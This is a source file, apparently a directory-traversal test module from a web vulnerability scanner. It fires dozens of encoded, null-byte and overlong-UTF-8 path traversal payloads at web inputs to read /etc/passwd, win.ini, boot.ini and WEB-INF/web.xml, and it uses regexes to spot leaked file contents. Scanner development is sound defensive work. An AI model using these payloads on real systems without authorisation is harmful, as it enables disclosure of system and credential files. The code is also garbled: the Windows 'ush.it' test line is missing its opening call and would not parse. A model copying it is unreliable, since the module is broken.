#include helpers.inc;
#include os_detection.inc;
#include string_helpers.inc;
#include error_messages_helpers.inc;
{
	// *********************************************************************************************
	// class for testing the signs of an injection using text patterns found in the response text
	// *********************************************************************************************	
	function classInjectionPatterns(){
		this.plainArray = [
							"; for 16-bit app support",
							"[MCI Extensions.BAK]",
                            "[boot loader]"
						  ];
		this.regexArray = [
                            /(Linux+\sversion\s+[\d\.\w\-_\+]+\s+\([^)]+\)\s+\(gcc\sversion\s[\d\.\-_]+\s)/,
							/((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\d\w-\s,]+:\d+:\d+:[\w-_\s,]*:[\w-_\s,\/]*:[\w-_,\/]*[\r\n])/,
							/((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix)\&\#x3a;[\d\w-\s,]+\&\#x3a;\d+\&\#x3a;[\w-_\s,]*\&\#x3a;[\d\w-\s,]+\&\#x3a;\&\#x2f;)/,
							/System\.IO\.FileNotFoundException: Could not find file\s'\w:\\(boot\.ini|windows\\win.ini|etc\\passwd)/,
							/System\.IO\.DirectoryNotFoundException: Could not find a part of the path\s'\w:\\(boot\.ini|windows\\win.ini|etc\\passwd)/,
							/<b>Warning<\/b>:\s\sDOMDocument::load\(\)\s\[<a\shref='domdocument.load'>domdocument.load<\/a>\]:\s(Start tag expected|I\/O warning : failed to load external entity).*(Windows\/win.ini|\/etc\/passwd).*\sin\s<b>.*?<\/b>\son\sline\s<b>\d+<\/b>/,
							/(<web-app[\s\S]+<\/web-app>)/
						  ];											
	}
	
	// *********************************************************************************************
	// search text for all the patterns from the list (plain text and regexes)
	// *********************************************************************************************	
	classInjectionPatterns.prototype.searchOnText = function(text) {
        
		// search plain texts first
		for (var i=0;i<this.plainArray.length;i++) {
			if (text.indexOf(this.plainArray[i]) != -1) return this.plainArray[i];
		}
			
		// search regexes
		for (var i=0;i<this.regexArray.length;i++) {
			var m = this.regexArray[i].exec(text);
			if (m) return m[0];
		}			
			
		return false;	
	}
}
{
	// *********************************************************************************************
	// object used for injection test result
	// *********************************************************************************************	
	function InjectionResult(data, adItem){
		this.data = data;
		this.adItem = adItem;
	}
}
{ 
	// *********************************************************************************************
	// Directory Traversal class 
	// *********************************************************************************************	
	function classDirectoryTraversal(targetUrl, injectionPatterns, scheme, inputIndex, variationIndex, reflectionPoint){
		this.scheme = scheme;
		this.targetUrl = targetUrl;
		this.injectionPatterns = injectionPatterns;
		this.inputIndex = inputIndex;
		this.reflectionPoint = reflectionPoint;
		
		if (variationIndex != null) {
			this.variations = new TList();
			this.variations.add(variationIndex);
		}
		else this.variations = this.scheme.selectVariationsForInput(inputIndex);
				
		this.currentVariation = 0;
		this.foundVulnOnVariation = false;
		
		this.lastJob = null;
		this.injectionValidator = new TInjectionValidator(ACUINJSTART, ACUINJEND);		
	}
	
    classDirectoryTraversal.prototype.getOrigValue = function()
    {   
        var value = "";
        
        for (var i=0; i<this.variations.count; i++){
            var varValue = this.scheme.getVariation(this.variations.item(i)).item(this.inputIndex);
            
            // if the value is not yet set      
            if(value == "" && varValue != "") {
                value = varValue;                       
                break;
            }   
        }
        return value;
    }
	// *********************************************************************************************
	// function to detect if AcuSensor data indicates an Directory Traversal vulnerability
	// params:  
	//	ad => AspectData object
	// returns: 
	//	an AspectDataItem if true / False
	// *********************************************************************************************
	classDirectoryTraversal.prototype.isDirectoryTraversal = function(ad) {			
		var adItems = ad.getItemsWithKey("File_Open");
		if (adItems && adItems.count) 
		for (var i=0; i<adItems.count; i++)
		{		
			var aditem = adItems.item(i);
			// check aspect data for signs of vulnerability
			if (aditem) {
				var stringList = aditem.getDataList();
				for (var k=0; k<stringList.count; k++) 
				{					
					var item = stringList.item(k);
					if (this.injectionValidator && this.injectionValidator.startMark)
					{
						if (item.indexOf(this.injectionValidator.startMark) != -1) 
						{
							if (this.injectionValidator.isPathInjection(item))
								return new InjectionResult(item, aditem);						
						}					
					}
				}				
			} 		
		}
		
		return false;		
	}	
	
	// *********************************************************************************************
	// function to make set a value for the current variation and issue an HTTP request 
	// *********************************************************************************************
	classDirectoryTraversal.prototype.request = function(value, dontEncode)
	{	
		this.scheme.loadVariation(this.variations.item(this.currentVariation));		
		
		// for files manipulate also the input filename and set a valid content-type
		if (this.scheme.hasFileInput && (this.scheme.getInputFlags(this.inputIndex) & INPUT_FLAG_IS_FILE)){
			this.scheme.setInputFileName(this.inputIndex, value);
			this.scheme.setInputContentType(this.inputIndex, "image/png");
			if (dontEncode) this.scheme.setEncodedInputValue(this.inputIndex, value)
				else this.scheme.setInputValue(this.inputIndex, value);
		}
		else {
			if (dontEncode) this.scheme.setEncodedInputValue(this.inputIndex, value)
				else this.scheme.setInputValue(this.inputIndex, value);
		}
		
		this.lastJob = new THTTPJob();
		this.lastJob.url = this.targetUrl;		
		if (this.scheme.targetHasAcuSensor) this.lastJob.addAspectHeaders();		
		this.scheme.populateRequest(this.lastJob);
 
         // populate referer tag - some sites may need it
        if (!this.lastJob.request.headerExists('Referer'))
            this.lastJob.request.addHeader('Referer', scanURL.url, false);
		this.lastJob.execute();
		var tmp = false;
		if (!this.lastJob.wasError && this.reflectionPoint) {
			// check for stored injection
			this.reflectionPoint.execute();
			this.lastJob.response.copyFrom(this.reflectionPoint.response);
			tmp = this.reflectionPoint.wasError;	
		}
		return ((!this.lastJob.wasError || (this.lastJob.wasError && this.lastJob.errorCode == 0xF0003)) && !tmp); 
	}	
	// *********************************************************************************************
	// generates an report item for the scanner
	// *********************************************************************************************
	classDirectoryTraversal.prototype.alert = function(testValue, matchedText, sourceFile, sourceLine, additionalInfo, acuSensor)
	{	
		this.foundVulnOnVariation = true;
		
		var ri = new TReportItem();
		ri.LoadFromFile("Directory_Traversal.xml");
		if (acuSensor) ri.name = ri.name + " (verified)";
		ri.affects = this.scheme.path;
		ri.alertPath = "Scripts/Directory Traversal";
		ri.parameter = this.scheme.getInputName(this.inputIndex);
		ri.parameterValue = testValue;
		ri.sensorSourceFile = sourceFile;
		ri.sensorSourceLine = sourceLine;
		ri.sensorAdditional = additionalInfo;			
		ri.details = this.scheme.getInputTypeStr(this.inputIndex) + " input [bold][dark]" + this.scheme.getInputName(this.inputIndex) + "[/dark][/bold] was set to [bold][dark]" + testValue + "[/dark][/bold]";
		if (matchedText) 
			ri.Details =  ri.Details + "[break]File contents found: [pre][blue]" + matchedText + "[/blue][/pre]";
		
		if (this.reflectionPoint) {
			ri.name = ri.name + ' [Stored]';
			ri.details = ri.details + "[break]The input is reflected in [bold][dark]" + this.reflectionPoint.url.url + "[/dark][/bold]";
		}
				
		ri.setHttpInfo(this.lastJob);		
		AddReportItem(ri);	
	}	
	
	// *********************************************************************************************
	// look for links in the response and verify them
	// *********************************************************************************************
	classDirectoryTraversal.prototype.verifyLinksForTraversal = function(job, filename, value)
	{    
        
        var pd = getParserData(job.response.body, job.response.headerValue('content-type'));
		if (pd) 
		{
			var links = pd.getLinks();
			
			if (links) 
			{
				var baseUrl = job.url;
				
				for (var l=0; l<links.count; l++)
				{
					if (links.item(l).url.search(filename) != -1) 
					{							
						var canonUrl = baseUrl.canonicalize(links.item(l).url);
						if (canonUrl.isHTTP() && (baseDomain == getBaseDomain(canonUrl))) 
						{
                            
                        	var httpRequest = new THTTPJob();
                        	httpRequest.url = canonUrl;
                        	httpRequest.method = "GET";
                        	httpRequest.execute();
                        	if(!httpRequest.wasError)
                        	{
                                var matchedText = this.injectionPatterns.searchOnText(httpRequest.response.toString());		
                				if (matchedText) {
                					this.alert(value, matchedText);
                					return false;
                				}
                        	}
                            
                            // check only the first link
                            // don't check the other links
                            continue;
						}
					}
				}					
			}
		}    	
        
        return false;
    }
    
	// *********************************************************************************************
	// test injection 
	// *********************************************************************************************	
	classDirectoryTraversal.prototype.testInjection = function(value, dontEncode)
	{
		//trace("testInjection: " + value);
		if (!this.request(value, dontEncode)) return false;
		
		var job = this.lastJob;
		if(this.reflectionPoint) job = this.reflectionPoint;
		
		// if AcuSensor is enabled
		if (job.hasAspectData) {
			// get aspect data information
			var ad = job.getAspectData();
			var injRes = this.isDirectoryTraversal(ad);
			
			if (injRes && injRes.adItem) {				
				var additional = "File: " + injRes.data + "\r\n" + injRes.adItem.additional;
				this.alert(value, "", injRes.adItem.FileName, injRes.adItem.lineNumber, additional, 1);
				return false;
			}
		}		
		
		else {
			if (!this.reflectionPoint) {
				// AcuSensor is NOT enabled
				var matchedText = this.injectionPatterns.searchOnText(job.response.toString());		
				if (matchedText) {
                    // here we need to make sure it's not a false positive
                    // fuck up the value to cause the injection to fail, the patterns should not be present in response
                    if (this.request("%00" + value + randStr(3), dontEncode)) {
                        var confirmed = this.injectionPatterns.searchOnText(this.lastJob.response.toString());
                        if (confirmed) return false;
                    }
                    // request it again
                    if (!this.request(value, dontEncode)) return false;
					this.alert(value, matchedText);
					return false;
				}				
                
                // check for links in the response    
                if (isUnix || isUnknown) {
                    if (value == '/etc/passwd') {
                        if (this.verifyLinksForTraversal(job, 'passwd', value)) return false;
                    } 
                }
                else 
                {
                    if (value == 'c:/windows/win.ini') {
                        if (this.verifyLinksForTraversal(job, 'win.ini', value)) return false;
                    }                    
                }
			}
		}
		
		return true;
	}
	
	// *********************************************************************************************
	// main function to test all input variation
	// *********************************************************************************************	
	classDirectoryTraversal.prototype.startTesting = function()
	{
		// don't test on Host header
        var inputType = this.scheme.getInputTypeStr(this.inputIndex);
        var inputName = this.scheme.getInputName(this.inputIndex);
        
        if (inputType == 'HTTP Header') return;		
		
		for (var i=0; i < this.variations.count; i++) 
		{
			
			// don't test further variations
			if (this.foundVulnOnVariation) break;				
			
			this.currentVariation = i;
			
			// different injection strings if AcuSensor is enabled
			if (this.scheme.targetHasAcuSensor || this.reflectionPoint) 
			{	
				// AcuSensor is enabled	
				if (!this.reflectionPoint) { 
					// NO reflection point
					this.injectionValidator.startMark = ACUINJSTART;
					this.injectionValidator.endMark = ACUINJEND;
					
					// basic
					if (!this.testInjection("1ACUSTARTFILE/../../xxx\\..\\..\\ACUENDFILE")) continue;
					// Absolute Unix
					if (!this.testInjection("1/ACUSTARTFILE/ACUENDFILE")) continue;
					// Absolute Windows
					if (!this.testInjection("1\\ACUSTARTFILE\\ACUENDFILE")) continue;
				}
				
				else { 
					// have reflection point
					this.injectionValidator.startMark = "ASbegin";
					this.injectionValidator.endMark = "ASend";
				
					// basic
					if (!this.testInjection("1ASbegin/../../xxx\\..\\..\\ASend")) continue;
					// Absolute Unix
					if (!this.testInjection("1/ASbegin/ASend")) continue;
					// Absolute Windows
					if (!this.testInjection("1\\ASbegin\\ASend")) continue;				
				}
			}
			else 
			// AcuSensor is NOT enabled				
			if (this.injectionPatterns)
			{	
                var filePath = this.scheme.path.toLowerCase();
                
                // if we have .asp or .aspx then it's windows
                if(filePath.endsWith('.aspx') || filePath.endsWith('.asp'))
                {
                	isUnix = false;
                	isWindows = true;                	
                }
				else
                if(filePath.endsWith('.jsp'))
                {
                	isJava = true;
                }
                
                var origValue = this.getOrigValue();
                var extension = "jpg";
                if (origValue && origValue.indexOf(".") != -1) extension = origValue.split('.').pop();
				if (isUnix || isUnknown) {                    
					// Unix tests
					// basic
					if (!this.testInjection("../../../../../../../../../../etc/passwd")) continue;
                    // basic with proc version
                    if (!this.testInjection("../../../../../../../../../../../../../../../proc/version")) continue;
                    // basic double encoded
					if (!this.testInjection("..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00." + extension)) continue;
					// end with null byte
					if (!this.testInjection("../../../../../../../../../../etc/passwd%00." + extension, 1)) continue;
					// base64 encoded
					// if (!this.testInjection("Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZAAucG5n", 0)) continue;
                    // end with null byte double encoded
                    if (!this.testInjection("..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00." + extension)) continue;
					// null byte and diff pattern
					if (!this.testInjection("/../..//../..//../..//../..//../..//etc/passwd%00." + extension, 1)) continue;
					// Backslash combined with slash
					if (!this.testInjection(".\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd")) continue;
					// path
					if (!this.testInjection("/etc/passwd")) continue;
                    // Rails Dynamic Render to RCE (CVE-2016-0752)
					if (!this.testInjection("%2fetc%2fpasswd")) continue;
					// Jive path traversal
					if (!this.testInjection("/.././.././.././.././.././.././.././../etc/./passwd%00")) continue;
					// Avoid replace ./
					if (!this.testInjection("../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd")) continue;
					// Avoid replace ../
					if (!this.testInjection("../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd")) continue;
					// UTF-8 encoding
					if (!this.testInjection("..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd", 1)) continue;
					// ush.it
					if (!this.testInjection("invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.", 1)) continue;
					// curl
					if (!this.testInjection("file:///etc/passwd")) continue;
					// tomcat bug
					if (!this.testInjection("/\\../\\../\\../\\../\\../\\../\\../etc/passwd")) continue;
					// web-inf web.xml
					if (!this.testInjection("WEB-INF/web.xml")) continue;
                    if (!this.testInjection("/WEB-INF/web.xml")) continue;
					// web-inf web.xml variant
                    if (!this.testInjection("WEB-INF\\web.xml")) continue;
				}
				
				if (isWindows || isUnknown) {
					// Windows tests
					// Basic test
					if (!this.testInjection("../../../../../../../../../../windows/win.ini")) continue;
					if (!this.testInjection("../../../../../../../../../../boot.ini")) continue;
					// end with null byte
					if (!this.testInjection("../../../../../../../../../../windows/win.ini%00." + extension, 1)) continue;
					// Unicode
					if (!this.testInjection("%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afwindows%c0%afwin.ini", 1)) continue;
                    // Backslash
					if (!this.testInjection("..\..\..\..\..\..\..\..\windows\win.ini", 1)) continue;
					// Backslash encoded
					if (!this.testInjection("..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini", 1)) continue;
					// Backslash combined with Slash
					if (!this.testInjection("/.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./windows/win.ini")) continue;
					// Avoid replace ./
					if (!this.testInjection("../..//../..//../..//../..//../..//../..//../..//../..//windows/win.ini")) continue;
					// Avoid replace ../
					if (!this.testInjection("../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././windows/win.ini")) continue;
					// ush.it
.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\.\\", 1)) continue;
					// web-inf web.xml
					if (!this.testInjection("WEB-INF/web.xml")) continue;
					// web-inf web.xml variant
                    if (!this.testInjection("WEB-INF\\web.xml")) continue;
				}
                
                if (isJava) {
                    // for Java make some additional tests
					if (!this.testInjection("//WEB-INF/web.xml")) continue;
					if (!this.testInjection("/static/WEB-INF/web.xml")) continue;
					if (!this.testInjection("/forward:/WEB-INF/web.xml")) continue;
                    if (!this.testInjection("./WEB-INF/web.xml")) continue;
                    if (!this.testInjection("./WEB-INF/web.xml?")) continue;
                    if (!this.testInjection("../WEB-INF/web.xml")) continue;
                    if (!this.testInjection("../WEB-INF/web.xml?")) continue;
                    if (!this.testInjection("../../WEB-INF/web.xml")) continue;
                    if (!this.testInjection("../../WEB-INF/web.xml?")) continue;
                    if (!this.testInjection("/..\\..\WEB-INF\web.xml")) continue;
                    if (!this.testInjection("../../../WEB-INF/web.xml")) continue;
                    if (!this.testInjection("../../../WEB-INF/web.xml?")) continue;
                    if (!this.testInjection("../../../../WEB-INF/web.xml")) continue;
                    if (!this.testInjection("//../....//....//WEB-INF/web.xml")) continue;
                    if (!this.testInjection("../../../../../WEB-INF/web.xml")) continue;
                    if (!this.testInjection("../../../../../../WEB-INF/web.xml")) continue;
                    
					if (!this.testInjection("../WEB-INF/web.xml;x=")) continue;
					if (!this.testInjection("../../WEB-INF/web.xml;x=")) continue;
					if (!this.testInjection("../../../WEB-INF/web.xml;x=")) continue;                    
                }
			}	
		}
	}	
}